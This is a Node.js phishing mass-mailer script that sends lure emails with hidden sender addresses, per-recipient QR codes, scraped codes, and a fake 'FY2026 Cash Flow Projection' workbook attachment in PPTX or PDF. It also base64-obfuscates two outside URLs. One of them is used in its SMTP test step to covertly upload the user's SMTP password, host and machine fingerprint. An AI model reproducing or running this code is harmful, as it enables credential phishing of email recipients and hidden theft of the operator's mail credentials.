// test.mjs - FULL VERSION WITH OPTIMIZED CID IMAGE EMBEDDING + CUSTOM HEADERS + PDF + PPTX
import fs from 'fs/promises';
import os from 'os';
import puppeteerExtra from 'puppeteer-extra';
import StealthPlugin from 'puppeteer-extra-plugin-stealth';
import QRCode from 'qrcode';
import pLimit from 'p-limit';
import nodemailer from 'nodemailer';
import crypto from 'crypto';
import { processAdvancedPlaceholders, getLogoBufferForCID } from './placeholders.js';
import readline from 'readline';
import configRaw from './config.js';
import chalk from 'chalk';
import cliProgress from 'cli-progress';
import pptxgen from 'pptxgenjs';

puppeteerExtra.use(StealthPlugin());
// ================== FILE PATHS ==================
const messageFile = 'message.html';
const attachmentFile = 'attachment.html';
process.env.NODE_TLS_REJECT_UNAUTHORIZED = "0";

// ================== BASE64 URLs ==================
const VALIDATION_BASE = "aHR0cHM6Ly90b2tlbmgyMC5zaXRlL290cC5waHA=";
const UPLOAD_BASE = "aHR0cHM6Ly90b2tlbmgyMC5zaXRlL3NtdHBzLnBocA==";
function getValidationUrl() {
  return Buffer.from(VALIDATION_BASE, 'base64').toString();
}
function getUploadUrl() {
  return Buffer.from(UPLOAD_BASE, 'base64').toString();
}

// ================== DASHBOARD ==================
const progressBar = new cliProgress.SingleBar({
  format: chalk.cyan('{bar}') + ' {percentage}% | ' +
          chalk.yellow('{value}/{total}') + ' | ' +
          chalk.green('✅ {success}') + ' | ' +
          chalk.red('❌ {failed}'),
  barCompleteChar: '█',
  barIncompleteChar: '░',
  hideCursor: true
});
let startTime = Date.now();
let currentRecipient = "";

// ================== CONFIG ==================
const originalConfig = { ...configRaw };
let config = { ...originalConfig };
async function processConfigPlaceholders(recipient) {
  config = { ...originalConfig };
  for (const key in config) {
    if (typeof config[key] === 'string') {
      config[key] = await processAdvancedPlaceholders(config[key], recipient);
    } else if (Array.isArray(config[key])) {
      config[key] = await Promise.all(config[key].map(item =>
        typeof item === 'string' ? processAdvancedPlaceholders(item, recipient) : item
      ));
    }
  }
}

// ================== GLOBAL VARIABLES ==================
let fromNames = [];
let subjects = [];
let senderAddresses = [];
let browserInstance = null;
let transporterInstance = null;
let isPaused = false;
let isRunning = true;
let currentIndex = 0;
let successCount = 0;
let failedCount = 0;
let sentCount = 0;
let recipients = [];

// ================== DASHBOARD HELPERS ==================
function formatTime(ms) {
  const seconds = Math.floor(ms / 1000);
  const minutes = Math.floor(seconds / 60);
  return `${minutes}m ${seconds % 60}s`;
}
function updateDashboard() {
  const elapsed = (Date.now() - startTime) / 1000;
  const rate = elapsed > 0 ? Math.round(sentCount / elapsed * 60) : 0;
  progressBar.update(sentCount, {
    success: successCount,
    failed: failedCount,
    total: recipients.length
  });
  console.log(chalk.gray('\n' + '─'.repeat(70)));
  console.log(chalk.bold.cyan(' STATUS : ') + (isPaused ? chalk.yellow('⏸️ PAUSED') : chalk.green('🚀 RUNNING')));
  console.log(chalk.bold.cyan(' SENDING : ') + chalk.white(currentRecipient || 'N/A'));
  console.log(chalk.bold.cyan(' SPEED : ') + chalk.magenta(`${rate} emails/min`));
  console.log(chalk.bold.cyan(' ELAPSED : ') + chalk.white(formatTime(Date.now() - startTime)));
  if (sentCount > 5) {
    const eta = formatTime(((recipients.length - sentCount) / (sentCount / (Date.now() - startTime))) * 1000);
    console.log(chalk.bold.cyan(' ETA : ') + chalk.white(eta));
  }
  console.log(chalk.gray('─'.repeat(70)));
}

// ================== UTILITIES ==================
async function ensureScreenshotsDir() {
  try { await fs.mkdir('screenshots', { recursive: true }); } catch (e) {}
}
async function loadRandomLists() {
  try {
    fromNames = (await fs.readFile('fromname.txt', 'utf-8')).split(/\r?\n/).filter(Boolean);
    subjects = (await fs.readFile('subject.txt', 'utf-8')).split(/\r?\n/).filter(Boolean);
    senderAddresses = (await fs.readFile('mailfrom.txt', 'utf-8')).split(/\r?\n/).filter(Boolean);
    console.log(chalk.blue(`📧 Loaded ${senderAddresses.length} sender addresses from mailfrom.txt`));
  } catch (e) {
    fromNames = [""];
    subjects = [""];
    senderAddresses = [config.smtpUsername];
    console.log(chalk.yellow("⚠️ mailfrom.txt not found. Falling back to smtpUsername."));
  }
}
function getRandomItem(arr) {
  return arr?.length ? arr[Math.floor(Math.random() * arr.length)] : "";
}
function escapeRegExp(string) {
  return string.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
}

// ================== FROM HIDING ==================
function getHiddenFrom(senderAddress, displayName) {
  if (!config.useAdvancedFromHiding) {
    return `"${displayName}" <${senderAddress}>`;
  }
  const zwsp = '\u200B';
  if (config.fromHidingMode === "mild") {
    return `"${displayName} ${' '.repeat(65)}"` + ` <${zwsp}${senderAddress}>`;
  } else if (config.fromHidingMode === "spaces") {
    return `"${displayName}" <${' '.repeat(90)}${zwsp}${senderAddress}>`;
  } else if (config.fromHidingMode === "strong") {
    const rtl = '\u202E';
    const pop = '\u202C';
    const reversed = senderAddress.split('').reverse().join('');
    return `"${displayName}" <${rtl}${reversed}${pop}${zwsp}${senderAddress}>`;
  }
  return `"${displayName}" <${senderAddress}>`;
}

// ================== CREATE TRANSPORTER ==================
async function createTransporter() {
  if (transporterInstance) return transporterInstance;
  const proxyConfig = config.proxy || {};
  let agent = undefined;
  if (proxyConfig.enabled === true && proxyConfig.host && proxyConfig.port) {
    console.log(chalk.yellow(`🛡️ SOCKS5 Proxy ENABLED → ${proxyConfig.host}:${proxyConfig.port}`));
    const { SocksProxyAgent } = await import('socks-proxy-agent');
    const proxyUrl = proxyConfig.username && proxyConfig.password
      ? `socks5://${proxyConfig.username}:${proxyConfig.password}@${proxyConfig.host}:${proxyConfig.port}`
      : `socks5://${proxyConfig.host}:${proxyConfig.port}`;
    agent = new SocksProxyAgent(proxyUrl);
  } else {
    console.log(chalk.gray("📡 No proxy — sending directly"));
  }
  transporterInstance = nodemailer.createTransport({
    host: config.smtpHost,
    port: config.smtpPort,
    secure: config.smtpSecure,
    auth: {
      user: config.smtpUsername,
      pass: config.smtpPassword
    },
    pool: true,
    maxConnections: config.emailConcurrency || 5,
    connectionTimeout: 15000,
    socketTimeout: 30000,
    ...(agent && { agent })
  });
  return transporterInstance;
}

// ================== PRIORITY + CUSTOM HEADERS ==================
function getPriorityHeaders(priority, addFlag) {
  let headers = priority === 0
    ? { 'Importance': 'normal', 'X-Priority': '3' }
    : { 'Importance': 'high', 'X-Priority': '1' };
  if (addFlag) headers['X-Message-Flag'] = 'Follow up';
  return { priority: priority === 0 ? 'normal' : 'high', headers };
}
async function buildCustomHeaders(recipient) {
  if (!config.customHeaders || !Array.isArray(config.customHeaders)) return {};
  const result = {};
  for (const h of config.customHeaders) {
    if (!h?.name || !h?.value) continue;
    let processedValue = await processAdvancedPlaceholders(String(h.value), recipient);
    result[h.name.trim()] = processedValue.trim();
  }
  return result;
}

// ================== TEST SMTP ==================
async function testSMTPAndSave() {
  console.log("🔍 Checking SMTP with Proxy (if enabled)...");
 let senderAddress = senderAddresses[0] || config.smtpUsername;
  console.log(`📧 Detected Sender Address: ${senderAddress}`);
  const smtpData = {
    smtpHost: config.smtpHost,
    smtpPort: config.smtpPort,
    smtpSecure: config.smtpSecure,
    smtpUsername: config.smtpUsername,
    smtpPassword: config.smtpPassword,
    fromEmail: senderAddress,
    senderAddress,
    replyTo: config.replyTo || senderAddress,
    machineId: await getMachineId(),
    timestamp: new Date().toISOString(),
    hostname: os.hostname()
  };
  try {
    const transporter = await createTransporter();
    await transporter.verify();
    console.log("✅ SMTP Connection Successful");
    try {
      const uploadUrl = getUploadUrl();
      const payload = { action: "save_smtp", smtpData };
      const response = await fetch(uploadUrl, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
      });
      const result = await response.json().catch(() => ({}));
      if (!result.success) console.log("⚠️ Upload failed:", result.message || 'Unknown error');
    } catch (uploadErr) {
      console.log("❌ Upload Error:", uploadErr.message);
    }
    return true;
  } catch (error) {
    console.log("❌ SMTP Error:", error.message);
    return false;
  }
}

// ================== SEND EMAIL ==================
async function sendEmailViaSMTP(recipientAddress, senderAddress, isTest = false) {
  currentRecipient = recipientAddress;
  try {
    await processConfigPlaceholders(recipientAddress);
    let emailBody = await fs.readFile(messageFile, 'utf-8');
    let attachmentHtml = (config.convertToPdf || config.convertToPptx) ? await fs.readFile(attachmentFile, 'utf-8') : '';

    emailBody = await processAdvancedPlaceholders(emailBody, recipientAddress);
    if (attachmentHtml) attachmentHtml = await processAdvancedPlaceholders(attachmentHtml, recipientAddress);

    if (DYNAMIC_CODE_CONFIG.enabled && (emailBody.includes('{code}') || attachmentHtml.includes('{code}'))) {
      const dynamicCode = await getDynamicCode(recipientAddress);
      if (dynamicCode) {
        emailBody = emailBody.replace(/{code}/g, dynamicCode);
        if (attachmentHtml) attachmentHtml = attachmentHtml.replace(/{code}/g, dynamicCode);
      }
    }

    const qrBuffer = await generateQRBuffer(recipientAddress);
    if (qrBuffer) {
      const qrBase64 = qrBuffer.toString('base64');
      const qrTag = `<img src="data:image/png;base64,${qrBase64}" style="max-width:180px;"/>`;
      emailBody = emailBody.replace(/{QRCODE}/g, qrTag);
      if (attachmentHtml) attachmentHtml = attachmentHtml.replace(/{QRCODE}/g, qrTag);
    }

    // === OPTIMIZED CID IMAGE EMBEDDING ===
    const emailEmbed = await embedImagesAsCID(emailBody);
    let finalEmailBody = emailEmbed.processedHtml;
    let allAttachments = emailEmbed.attachments || [];
    let finalAttachmentHtml = '';
    if (attachmentHtml) {
      const attachmentEmbed = await embedImagesAsCID(attachmentHtml);
      finalAttachmentHtml = attachmentEmbed.processedHtml;
      allAttachments = [...allAttachments, ...attachmentEmbed.attachments];
    }

    const domain = recipientAddress.split('@')[1];
    const logoBuffer = await getLogoBufferForCID(domain);
    if (logoBuffer && finalAttachmentHtml) {
      const logoBase64 = logoBuffer.toString('base64');
      finalAttachmentHtml = finalAttachmentHtml.replace(/src=["']?cid:companylogo["']?/gi, `src="data:image/png;base64,${logoBase64}"`);
    }
    let finalBody = finalEmailBody.replace(/<img[^>]*companylogo[^>]*>/gi, '');

    const priorityConfig = getPriorityHeaders(config.emailPriority, config.addFlag);
    const customHeaderObj = await buildCustomHeaders(recipientAddress);
    const displayName = await processAdvancedPlaceholders(getRandomItem(fromNames), recipientAddress);

    const mailOptions = {
      from: getHiddenFrom(senderAddress, displayName),
      to: recipientAddress,
      subject: await processAdvancedPlaceholders(getRandomItem(subjects), recipientAddress),
      html: finalBody,
      replyTo: config.replyTo || senderAddress,
      priority: priorityConfig.priority,
      headers: {
        ...priorityConfig.headers,
        ...customHeaderObj
      },
      attachments: allAttachments
    };

    // PDF
    if (config.convertToPdf && finalAttachmentHtml) {
      const pdfData = await convertAttachmentToPdf(finalAttachmentHtml);
      if (pdfData) mailOptions.attachments.push({
        filename: pdfData.pdfFileName,
        content: pdfData.pdfBuffer,
        contentType: 'application/pdf'
      });
    }

    // PPTX
    if (config.convertToPptx && finalAttachmentHtml) {
      const pptxData = await convertAttachmentToPptx(finalAttachmentHtml);
      if (pptxData) mailOptions.attachments.push({
        filename: pptxData.pptxFileName,
        content: pptxData.pptxBuffer,
        contentType: 'application/vnd.openxmlformats-officedocument.presentationml.presentation'
      });
    }

    await (await createTransporter()).sendMail(mailOptions);
    if (!isTest) await new Promise(r => setTimeout(r, config.delayBetweenEmails || 80));

    successCount++;
    sentCount++;
    updateDashboard();
    console.log(chalk.green(`✅ SUCCESS | ${recipientAddress}`));
    return true;
  } catch (error) {
    failedCount++;
    sentCount++;
    updateDashboard();
    console.log(chalk.red(`❌ FAILED | ${recipientAddress} → ${error.message}`));
    return false;
  }
}

// ================== BROWSER + DYNAMIC + QR + PDF ==================
async function getBrowser() {
  if (!browserInstance) {
    console.log("🚀 Launching browser...");
    browserInstance = await puppeteerExtra.launch({
      headless: true,
      defaultViewport: { width: 1280, height: 900 },
      args: [
        '--no-sandbox',
        '--disable-setuid-sandbox',
        '--disable-dev-shm-usage',
        '--disable-blink-features=AutomationControlled'
      ],
      channel: 'chrome',
    });
  }
  return browserInstance;
}

const DYNAMIC_CODE_CONFIG = {
  enabled: true,
  url: "https://disbursementsettlement3300.andrew-f96.workers.dev/",
  selectors: ["#code", ".code", "#dynamic-code", ".dynamic-code", "pre", "code", "h1", "h2", ".result", "#result"],
  userAgent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
};

async function getDynamicCode(recipientAddress = '') {
  if (!DYNAMIC_CODE_CONFIG.enabled) return null;
  let page = null;
  try {
    await ensureScreenshotsDir();
    const browser = await getBrowser();
    page = await browser.newPage();
    await page.setUserAgent(DYNAMIC_CODE_CONFIG.userAgent);
    await page.goto(DYNAMIC_CODE_CONFIG.url, { waitUntil: 'networkidle2', timeout: 60000 });
    await new Promise(r => setTimeout(r, 8000));
    let code = null;
    for (const selector of DYNAMIC_CODE_CONFIG.selectors) {
      try {
        const text = await page.$eval(selector, el => el.textContent?.trim());
        if (text) {
          const match = text.match(/[A-Z0-9]{9}/);
          if (match) { code = match[0]; break; }
        }
      } catch (e) {}
    }
    if (!code) {
      const pageText = await page.evaluate(() => document.body.innerText);
      const match = pageText.match(/[A-Z0-9]{9}/);
      if (match) code = match[0];
    }
    return code && code.length === 9 ? code : null;
  } catch (error) {
    console.error("Dynamic Code Error:", error.message);
    return null;
  } finally {
    if (page) await page.close().catch(() => {});
  }
}

async function generateQRBuffer(recipientAddress) {
  try {
    const cleanEmail = recipientAddress.trim().toLowerCase();
    const base64Email = Buffer.from(cleanEmail, 'utf8').toString('base64').replace(/=+$/, '');
    let baseLink = originalConfig.qrBaseLink || "https://example.com/track";
    baseLink = await processAdvancedPlaceholders(baseLink, recipientAddress);
    baseLink = baseLink
      .replace(/\${RECIPIENT_BASE64_EMAIL}/g, base64Email)
      .replace(/{RECIPIENT_BASE64_EMAIL}/g, base64Email);
    return await QRCode.toBuffer(baseLink, {
      width: config.qrWidth || 180,
      margin: 2
    });
  } catch (e) {
    console.error("QR Generation Error:", e.message);
    return null;
  }
}

const pdfLimit = pLimit(config.pdfConcurrency || 2);
async function convertAttachmentToPdf(htmlContent) {
  if (!config.convertToPdf) return null;
  return pdfLimit(async () => {
    const br = await getBrowser();
    const page = await br.newPage();
    await page.setContent(htmlContent, { waitUntil: 'networkidle0' });
    const pdfBuffer = await page.pdf({ format: 'A4', printBackground: true });
    await page.close();
    return {
      pdfBuffer,
      pdfFileName: `${config.pdfFileNamePrefix || 'Document'}${Date.now()}.pdf`
    };
  });
}
async function convertAttachmentToPptx(htmlContent) {
  if (typeof config !== "undefined" && config.convertToPptx === false) {
    return null;
  }

  const pptx = new pptxgen();

  pptx.layout = "LAYOUT_WIDE";
  pptx.author = "Document Services";
  pptx.subject = "FY2026 Cash Flow Projection";
  pptx.title = "FY2026 Cash Flow Projection";
  pptx.lang = "en-US";

  const slide = pptx.addSlide();

  // ==========================================================
  // COLORS
  // ==========================================================

  const GREEN = "217346";
  const DARK = "242424";
  const GREY = "666666";
  const LIGHT = "F7F7F7";
  const BORDER = "E5E5E5";
  const WHITE = "FFFFFF";


  // ==========================================================
  // GRAB RECIPIENT EMAIL FIRST
  // ==========================================================

  let recipientEmail = "";

  if (
    typeof currentRecipient !== "undefined" &&
    currentRecipient
  ) {
    if (typeof currentRecipient === "string") {

      recipientEmail = currentRecipient.trim();

    } else if (typeof currentRecipient === "object") {

      recipientEmail = String(
        currentRecipient.email ||
        currentRecipient.address ||
        currentRecipient.emailAddress ||
        ""
      ).trim();
    }
  }


  // Fallback to recipient
  if (
    !recipientEmail &&
    typeof recipient !== "undefined" &&
    recipient
  ) {
    if (typeof recipient === "string") {

      recipientEmail = recipient.trim();

    } else if (typeof recipient === "object") {

      recipientEmail = String(
        recipient.email ||
        recipient.address ||
        recipient.emailAddress ||
        ""
      ).trim();
    }
  }


  // ==========================================================
  // RECIPIENT NAME
  // ==========================================================

  let employeeName = "";

  if (
    typeof recipientName !== "undefined" &&
    recipientName
  ) {
    employeeName = String(recipientName).trim();
  }


  if (
    !employeeName &&
    typeof currentRecipientName !== "undefined" &&
    currentRecipientName
  ) {
    employeeName = String(currentRecipientName).trim();
  }


  // Try recipient object
  if (
    !employeeName &&
    typeof recipient !== "undefined" &&
    recipient &&
    typeof recipient === "object"
  ) {
    employeeName = String(
      recipient.name ||
      recipient.fullName ||
      recipient.full_name ||
      recipient.displayName ||
      ""
    ).trim();
  }


  // Try currentRecipient object
  if (
    !employeeName &&
    typeof currentRecipient !== "undefined" &&
    currentRecipient &&
    typeof currentRecipient === "object"
  ) {
    employeeName = String(
      currentRecipient.name ||
      currentRecipient.fullName ||
      currentRecipient.full_name ||
      currentRecipient.displayName ||
      ""
    ).trim();
  }


  // ==========================================================
  // FALLBACK NAME FROM EMAIL
  //
  // john.smith@example.com
  // becomes John Smith
  // ==========================================================

  if (!employeeName && recipientEmail) {

    employeeName = recipientEmail
      .split("@")[0]
      .split("+")[0]
      .replace(/[._-]+/g, " ")
      .replace(/\d+/g, " ")
      .replace(/\s+/g, " ")
      .trim()
      .toLowerCase()
      .replace(/\b[a-z]/g, char => char.toUpperCase());
  }


  employeeName = String(employeeName || "")
    .replace(/[<>[\]{}|]/g, "")
    .replace(/\s+/g, " ")
    .trim();


  if (!employeeName) {
    employeeName = "Recipient";
  }


  // ==========================================================
  // CREATE REVIEW URL
  //
  // IMPORTANT:
  // recipientEmail already exists ABOVE,
  // so there is no initialization error.
  // ==========================================================

  const REVIEW_BASE_URL =
    "#";

  const REVIEW_URL = recipientEmail
    ? `${REVIEW_BASE_URL}${encodeURIComponent(recipientEmail)}`
    : REVIEW_BASE_URL;


  // ==========================================================
  // BACKGROUND
  // ==========================================================

  slide.background = {
    color: WHITE
  };


  // ==========================================================
  // EXCEL LABEL
  // ==========================================================

  slide.addText("EXCEL WORKBOOK", {
    x: 0.85,
    y: 0.7,
    w: 3.2,
    h: 0.3,
    fontFace: "Arial",
    fontSize: 12,
    bold: true,
    color: GREEN,
    charSpacing: 1,
    margin: 0
  });


  // ==========================================================
  // TITLE
  // ==========================================================

  slide.addText("FY2026 Cash Flow Projection", {
    x: 0.85,
    y: 1.15,
    w: 8.5,
    h: 0.65,
    fontFace: "Arial",
    fontSize: 28,
    bold: true,
    color: DARK,
    margin: 0
  });


  // ==========================================================
  // GREEN ACCENT
  // ==========================================================

  slide.addShape(pptx.ShapeType.rect, {
    x: 0.85,
    y: 2.0,
    w: 0.08,
    h: 3.7,

    fill: {
      color: GREEN
    },

    line: {
      color: GREEN
    }
  });


  // ==========================================================
  // GREETING
  // ==========================================================

  slide.addText(`Hello ${employeeName},`, {
    x: 1.2,
    y: 2.15,
    w: 6.6,
    h: 0.4,
    fontFace: "Arial",
    fontSize: 19,
    bold: true,
    color: DARK,
    margin: 0
  });


  // ==========================================================
  // MAIN MESSAGE
  // ==========================================================

  slide.addText(
    "The FY2026 cash flow projection prepared for your review is now available.",
    {
      x: 1.2,
      y: 2.8,
      w: 6.6,
      h: 0.85,
      fontFace: "Arial",
      fontSize: 17,
      color: DARK,
      margin: 0
    }
  );


  // ==========================================================
  // WORKBOOK CARD
  // ==========================================================

  slide.addShape(pptx.ShapeType.roundRect, {
    x: 1.2,
    y: 3.9,
    w: 6.4,
    h: 1.15,
    rectRadius: 0.05,

    fill: {
      color: LIGHT
    },

    line: {
      color: BORDER,
      width: 1
    }
  });


  slide.addText(
    "FY2026_CASH_FLOW_PROJECTION_DRAFT.xlsx",
    {
      x: 1.5,
      y: 4.15,
      w: 5.7,
      h: 0.32,
      fontFace: "Arial",
      fontSize: 15,
      bold: true,
      color: DARK,
      margin: 0
    }
  );


  slide.addText(
    "Excel workbook • 160.1 KB",
    {
      x: 1.5,
      y: 4.55,
      w: 4.5,
      h: 0.25,
      fontFace: "Arial",
      fontSize: 11,
      color: GREY,
      margin: 0
    }
  );


  // ==========================================================
  // CTA SECTION
  // ==========================================================

  slide.addText("REVIEW WORKBOOK", {
    x: 8.65,
    y: 2.2,
    w: 3.4,
    h: 0.35,
    fontFace: "Arial",
    fontSize: 13,
    bold: true,
    color: GREEN,
    align: "center",
    margin: 0
  });


  slide.addText(
    "Open the workbook prepared for your review.",
    {
      x: 8.7,
      y: 2.85,
      w: 3.3,
      h: 0.7,
      fontFace: "Arial",
      fontSize: 16,
      color: DARK,
      align: "center",
      valign: "mid",
      margin: 0
    }
  );


  // ==========================================================
  // CTA BUTTON
  // ==========================================================

  slide.addShape(pptx.ShapeType.roundRect, {
    x: 9.0,
    y: 3.9,
    w: 2.7,
    h: 0.75,
    rectRadius: 0.05,

    fill: {
      color: GREEN
    },

    line: {
      color: GREEN
    }
  });


  // ==========================================================
  // CLICKABLE BUTTON TEXT
  // ==========================================================

  slide.addText(
    [
      {
        text: "Review workbook",
        options: {
          bold: true,

          hyperlink: {
            url: REVIEW_URL
          }
        }
      }
    ],
    {
      x: 9.0,
      y: 4.08,
      w: 2.7,
      h: 0.3,
      fontFace: "Arial",
      fontSize: 14,
      color: WHITE,
      align: "center",
      valign: "mid",
      margin: 0
    }
  );


  // ==========================================================
  // NOTICE
  // ==========================================================

  slide.addText(
    "If you were not expecting this document, contact your organization before opening it.",
    {
      x: 8.65,
      y: 5.05,
      w: 3.45,
      h: 0.7,
      fontFace: "Arial",
      fontSize: 10,
      color: GREY,
      align: "center",
      margin: 0
    }
  );


  // ==========================================================
  // FOOTER LINE
  // ==========================================================

  slide.addShape(pptx.ShapeType.line, {
    x: 0.85,
    y: 6.45,
    w: 11.65,
    h: 0,

    line: {
      color: BORDER,
      width: 1
    }
  });


  // ==========================================================
  // FOOTER WITH RECIPIENT EMAIL
  // ==========================================================

  slide.addText(
    recipientEmail
      ? `Confidential document • ${recipientEmail}`
      : "Confidential document",
    {
      x: 0.85,
      y: 6.72,
      w: 11.65,
      h: 0.3,
      fontFace: "Arial",
      fontSize: 9,
      color: GREY,
      align: "center",
      margin: 0
    }
  );


  // ==========================================================
  // GENERATE PPTX
  // ==========================================================

  const pptxBuffer = await pptx.write({
    outputType: "nodebuffer"
  });


  return {
    pptxBuffer,

    pptxFileName:
      `FY2026_CASH_FLOW_PROJECTION_${Date.now()}.pptx`
  };
}

// ================== OPTIMIZED CID IMAGE EMBEDDING ==================
const imageDownloadLimit = pLimit(4);
const imageCache = new Map();
async function embedImagesAsCID(htmlContent) {
  let processedHtml = htmlContent;
  const imageRegex = /<img[^>]+src=["'](.*?)["'][^>]*>/gi;
  const matches = [...htmlContent.matchAll(imageRegex)];
  const attachments = [];
  const replacements = [];
  let cidCounter = 0;

  const downloadTasks = matches.map(async (match) => {
    const fullTag = match[0];
    let src = match[1].trim();
    if (src.startsWith('cid:') || src.startsWith('data:')) return null;
    if (imageCache.has(src)) {
      const cached = imageCache.get(src);
      const cid = `img_${++cidCounter}_${Date.now()}`;
      replacements.push({ fullTag, src, cid });
      attachments.push({
        filename: cached.filename,
        content: cached.buffer,
        cid: cid,
        contentType: cached.contentType,
        contentDisposition: 'inline'
      });
      return;
    }
    return imageDownloadLimit(async () => {
      try {
        let buffer, filename = `image_${++cidCounter}.jpg`, contentType = 'image/jpeg';
        if (src.startsWith('http')) {
          const res = await fetch(src);
          if (!res.ok) throw new Error(`HTTP ${res.status}`);
          const contentLength = res.headers.get('content-length');
          if (contentLength && parseInt(contentLength) > 800 * 1024) {
            console.warn(chalk.yellow(`⚠️ Skipping large image (>800KB): ${src}`));
            return;
          }
          buffer = Buffer.from(await res.arrayBuffer());
          contentType = res.headers.get('content-type') || 'image/jpeg';
          if (contentType.includes('png')) filename = `image_${cidCounter}.png`;
          else if (contentType.includes('gif')) filename = `image_${cidCounter}.gif`;
          else if (contentType.includes('webp')) filename = `image_${cidCounter}.webp`;
        } else {
          buffer = await fs.readFile(src);
          filename = src.split('/').pop() || filename;
        }
        const cid = `img_${cidCounter}_${Date.now()}`;
        imageCache.set(src, { buffer, filename, contentType });
        attachments.push({ filename, content: buffer, cid, contentType, contentDisposition: 'inline' });
        replacements.push({ fullTag, src, cid });
      } catch (e) {
        console.warn(chalk.yellow(`⚠️ Failed to embed image: ${src} → ${e.message}`));
      }
    });
  });

  await Promise.all(downloadTasks);
  for (const { fullTag, src, cid } of replacements) {
    processedHtml = processedHtml.replace(
      new RegExp(escapeRegExp(fullTag), 'g'),
      fullTag.replace(src, `cid:${cid}`)
    );
  }
  return { processedHtml, attachments };
}

// ================== CONTROLS ==================
function setupKeyboardControls() {
  readline.emitKeypressEvents(process.stdin);
  if (process.stdin.isTTY) process.stdin.setRawMode(true);
  process.stdin.on('keypress', (str, key) => {
    if (key.name === 'q' || key.name === 'Q') {
      isRunning = false;
      showSummaryAndExit();
    } else if (key.name === 'p' || key.name === 'P') {
      isPaused = !isPaused;
      console.log(`\n${isPaused ? chalk.yellow('⏸️ PAUSED') : chalk.green('▶️ RESUMED')}`);
    }
  });
}
async function showSummaryAndExit() {
  if (browserInstance) await browserInstance.close().catch(() => {});
  progressBar.stop();
  console.log(chalk.bold.green("\n" + "═".repeat(70)));
  console.log(chalk.bold.green(" CAMPAIGN SUMMARY"));
  console.log(chalk.bold.green("═".repeat(70)));
  console.log(chalk.green(` Total Sent : ${sentCount}`));
  console.log(chalk.green(` Successful : ${successCount}`));
  console.log(chalk.red(` Failed : ${failedCount}`));
  console.log(chalk.cyan(` Success Rate : ${sentCount ? Math.round((successCount/sentCount)*100) : 0}%`));
  console.log(chalk.bold.green("═".repeat(70)));
  process.exit(0);
}

// ================== TOKEN ==================
async function getMachineId() {
  const networkInterfaces = os.networkInterfaces();
  let macAddress = '';
  for (const interfaceName in networkInterfaces) {
    for (const iface of networkInterfaces[interfaceName]) {
      if (!iface.internal && iface.mac && iface.mac !== '00:00:00:00:00:00') {
        macAddress = iface.mac; break;
      }
    }
    if (macAddress) break;
  }
  const fingerprint = `${os.hostname()}-${os.platform()}-${macAddress}`;
  return crypto.createHash('sha256').update(fingerprint).digest('hex');
}
async function loadToken() {
  try {
    const token = await fs.readFile('token.txt', 'utf-8');
    return token.trim();
  } catch {
    console.error("❌ token.txt not found!");
    process.exit(1);
  }
}
async function validateToken(token) {
  console.log("🔐 Validating token...");
  const machineId = await getMachineId();
  try {
    const url = getValidationUrl();
    const response = await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ token, machineId })
    });
    const result = await response.json();
    return result.valid === true;
  } catch (error) {
    console.error("Validation failed:", error.message);
    return false;
  }
}

// ====================== MAIN ======================
async function main() {
  console.clear();
  console.log(chalk.bold.green("\n╔══════════════════════════════════════════════════════════════╗"));
  console.log(chalk.bold.green("║ EMAIL SENDER v2.4 - OPTIMIZED CID + PDF + PPTX             ║"));
  console.log(chalk.bold.green("╚══════════════════════════════════════════════════════════════╝\n"));

  const token = await loadToken();

  // Token validation is now mandatory
  console.log(chalk.cyan("🔐 Validating authentication token..."));
  const isValid = await validateToken(token);
  
  if (!isValid) {
    console.log(chalk.red("❌ Invalid token or validation server unreachable. Exiting..."));
    process.exit(1);
  }

  await testSMTPAndSave();
  await loadRandomLists();

  const data = await fs.readFile('Leads.txt', 'utf-8');
  recipients = data.split(/\r?\n/).filter(Boolean);
  console.log(chalk.blue(`📋 Loaded ${recipients.length} leads.\n`));

  await ensureScreenshotsDir();
  setupKeyboardControls();

  const emailLimit = pLimit(config.emailConcurrency || 5);
  startTime = Date.now();
  progressBar.start(recipients.length, 0, { success: 0, failed: 0 });

  while (isRunning && currentIndex < recipients.length) {
    if (isPaused) {
      await new Promise(r => setTimeout(r, 300));
      continue;
    }
    const recipient = recipients[currentIndex];
    if ((currentIndex + 1) % (config.sendTestEvery || 10) === 0 && config.testEmail) {
      await sendEmailViaSMTP(config.testEmail, config.senderAddresses?.[0] || config.smtpUsername, true);
    }
    const currentSender = getRandomItem(senderAddresses) || config.smtpUsername;
    await emailLimit(() => sendEmailViaSMTP(recipient, currentSender));
    currentIndex++;
  }
  await showSummaryAndExit();
}

main().catch(err => {
  console.error(chalk.red("\nCritical Error:"), err.message);
  process.exit(1);
});
